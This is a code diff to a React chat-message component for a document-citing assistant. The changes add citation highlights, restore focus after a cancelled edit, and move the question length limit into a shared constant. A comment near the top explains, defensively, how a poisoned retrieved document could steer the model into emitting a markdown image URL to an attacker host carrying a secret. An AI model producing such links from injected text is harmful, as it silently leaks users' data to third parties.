@@ -9,6 +9,7 @@ import { useMarkdownRenderer } from './markdownLoader';
 import StreamingSkeleton from './StreamingSkeleton';
 import './ChatMessage.css';
 import { isImeComposing } from '../utils/keyboard';
+import { MAX_QUESTION_CHARS } from '../utils/limits';
 
 // Answers quote retrieved documents, and a poisoned document can steer the model into
 // writing `![](https://attacker/?q=<secret>)` — which the browser would fetch the moment
@@ -89,7 +90,8 @@ interface ChatMessageProps {
   // build the request) and leaves the actual POST /feedback call to the caller — see
   // FeedbackPayload above.
   onFeedback?: (payload: FeedbackPayload) => void;
-  onOpenSource?: (filename: string, chunkId: string) => void;
+  /** `highlights`: the cited passages to mark in the document (CitationResponse.spans). */
+  onOpenSource?: (filename: string, chunkId: string, highlights?: string[]) => void;
   onCitationHover?: (citation: CitationResponse) => void;
   onCitationLeave?: () => void;
   // A question is in flight: Regenerate and Retry would be silently ignored by useChat.
@@ -98,6 +100,10 @@ interface ChatMessageProps {
 
 function formatDuration(totalMs: number): string {
   return `${(totalMs / 1000).toFixed(2)}s`;
+}
+
+function quotesOf(source: CitationResponse): string[] | undefined {
+  return source.spans?.length ? source.spans.map((span) => span.quote) : undefined;
 }
 
 function ChatMessage({
@@ -180,6 +186,19 @@ function ChatMessage({
 
   const [editing, setEditing] = useState(false);
   const [draft, setDraft] = useState(turn.content);
+  // A cancelled edit hands focus back to ✎: the editor unmounting dropped it to <body>.
+  // (A sent edit opens a new conversation, which moves focus on its own.)
+  const editButtonRef = useRef<HTMLButtonElement>(null);
+  const refocusEditRef = useRef(false);
+  const cancelEdit = () => {
+    refocusEditRef.current = true;
+    setEditing(false);
+  };
+  useEffect(() => {
+    if (editing || !refocusEditRef.current) return;
+    refocusEditRef.current = false;
+    editButtonRef.current?.focus();
+  }, [editing]);
   const submitEdit = () => {
     const question = draft.trim();
     if (!question || !onEditQuestion) return;
@@ -221,7 +240,7 @@ function ChatMessage({
             className="chat-message__cite"
             onClick={() => {
               onCitationLeave?.();
-              onOpenSource?.(source.filename, source.chunk_id);
+              onOpenSource?.(source.filename, source.chunk_id, quotesOf(source));
             }}
             onMouseEnter={() => onCitationHover?.(source)}
             onMouseLeave={onCitationLeave}
@@ -272,14 +291,14 @@ function ChatMessage({
                   if (isImeComposing(event)) return;
                   if (event.key === 'Escape') {
                     event.stopPropagation();
-                    setEditing(false);
+                    cancelEdit();
                   } else if (event.key === 'Enter' && !event.shiftKey) {
                     event.preventDefault();
                     submitEdit();
                   }
                 }}
                 aria-label="Edit question"
-                maxLength={4000}
+                maxLength={MAX_QUESTION_CHARS}
                 rows={2}
                 autoFocus
                 data-testid="chat-message-edit-input"
@@ -288,7 +307,7 @@ function ChatMessage({
                 <button type="submit" disabled={busy || !draft.trim()} data-testid="chat-message-edit-send">
                   Ask as new chat
                 </button>
-                <button type="button" onClick={() => setEditing(false)}>
+                <button type="button" onClick={cancelEdit}>
                   Cancel
                 </button>
               </div>
@@ -298,6 +317,7 @@ function ChatMessage({
               <p className="chat-message__question">{turn.content}</p>
               {onEditQuestion && (
                 <button
+                  ref={editButtonRef}
                   type="button"
                   className="chat-message__edit-button"
                   onClick={() => {
@@ -443,7 +463,11 @@ function ChatMessage({
                     filename={source.filename}
                     page={source.page}
                     section={source.section}
-                    onOpen={onOpenSource ? () => onOpenSource(source.filename, source.chunk_id) : undefined}
+                    onOpen={
+                      onOpenSource
+                        ? () => onOpenSource(source.filename, source.chunk_id, quotesOf(source))
+                        : undefined
+                    }
                     onHoverStart={onCitationHover ? () => onCitationHover(source) : undefined}
                     onHoverEnd={onCitationLeave}
                   />
